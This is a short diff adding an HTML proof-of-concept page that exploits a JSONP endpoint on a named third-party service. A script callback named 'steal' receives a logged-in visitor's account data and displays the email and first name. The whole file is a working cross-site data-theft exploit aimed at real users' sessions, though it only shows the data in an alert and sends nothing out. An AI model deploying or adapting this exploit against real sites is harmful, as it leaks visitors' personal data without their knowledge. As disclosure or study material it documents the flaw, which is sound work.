@@ -1,0 +1,12 @@
+<html>
+<body>
+<script>
+function steal(data) {
+    alert("Email: " + data.data.email + 
+    "\nName: " + data.data.first_name);
+}
+</script>
+<script src="https://app.sproutsocial.com/api/me/personal_settings/?pretty=&callback=steal">
+</script>
+</body>
+</html>
